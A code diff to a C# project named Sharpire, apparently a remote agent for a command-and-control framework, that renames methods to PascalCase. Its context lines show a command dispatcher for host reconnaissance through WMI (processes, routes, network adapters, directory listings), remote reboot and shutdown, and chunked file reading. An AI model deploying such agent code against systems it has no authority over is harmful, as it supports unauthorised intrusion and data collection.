@@ -156,7 +156,7 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal static byte[] getFilePart(string file, int index, int chunkSize)
+        internal static byte[] GetFilePart(string file, int index, int chunkSize)
         {
             byte[] output = new byte[0];
             try
@@ -240,7 +240,7 @@ namespace Sharpire
             {
                 if (command == "ls" || command == "dir" || command == "gci")
                 {
-                    output = getChildItem(arguments);
+                    output = GetChildItem(arguments);
                 }
                 else if (command == "mv" || command == "move")
                 {
@@ -270,15 +270,15 @@ namespace Sharpire
                 }
                 else if (command == "ifconfig" || command == "ipconfig")
                 {
-                    output = ifconfig();
+                    output = Ifconfig();
                 }
                 else if (command == "ps" || command == "tasklist")
                 {
-                    output = tasklist(arguments);
+                    output = Tasklist(arguments);
                 }
                 else if (command == "route")
                 {
-                    output = route(arguments);
+                    output = Route(arguments);
                 }
                 else if (command == "whoami" || command == "getuid")
                 {
@@ -290,11 +290,11 @@ namespace Sharpire
                 }
                 else if (command == "reboot" || command == "restart")
                 {
-                    shutdown("2");
+                    Shutdown("2");
                 }
                 else if (command == "shutdown")
                 {
-                    shutdown("5");
+                    Shutdown("5");
                 }
                 else
                 {
@@ -308,7 +308,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static void shutdown(string flags)
+        private static void Shutdown(string flags)
         {
             ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
             managementClass.Get();
@@ -328,7 +328,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static string route(string arguments)
+        private static string Route(string arguments)
         {
             Dictionary<uint, string> adapters = new Dictionary<uint, string>();
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
@@ -338,7 +338,7 @@ namespace Sharpire
             ManagementObjectCollection objectCollection = objectSearcher.Get();
             foreach (ManagementObject managementObject in objectCollection)
             {
-                adapters[(uint)managementObject["InterfaceIndex"]] = managementObjectToString((string[])managementObject["IPAddress"]);
+                adapters[(uint)managementObject["InterfaceIndex"]] = ManagementObjectToString((string[])managementObject["IPAddress"]);
             }
 
             List<string> lines = new List<string>();
@@ -390,7 +390,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static string tasklist(string arguments)
+        private static string Tasklist(string arguments)
         {
             Dictionary<int, string> owners = new Dictionary<int, string>();
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
@@ -483,7 +483,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static string ifconfig()
+        private static string Ifconfig()
         {
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
             scope.Connect();
@@ -499,12 +499,12 @@ namespace Sharpire
                         string.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
                         string.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
                         string.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", managementObjectToString((string[])managementObject["IPAddress"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", managementObjectToString((string[])managementObject["IPSubnet"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", managementObjectToString((string[])managementObject["DefaultIPGateway"])) +
-                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", managementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", ManagementObjectToString((string[])managementObject["IPAddress"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", ManagementObjectToString((string[])managementObject["IPSubnet"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", ManagementObjectToString((string[])managementObject["DefaultIPGateway"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", ManagementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
                         string.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
-                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", managementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
+                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", ManagementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
                     );
                 }
             }
@@ -565,7 +565,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static string managementObjectToString(string[] managementObject)
+        private static string ManagementObjectToString(string[] managementObject)
         {
             string output;
             if (managementObject != null && managementObject.Length > 0)
@@ -582,7 +582,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static string getChildItem(string folder)
+        private static string GetChildItem(string folder)
         {
             if (folder == "")
             {
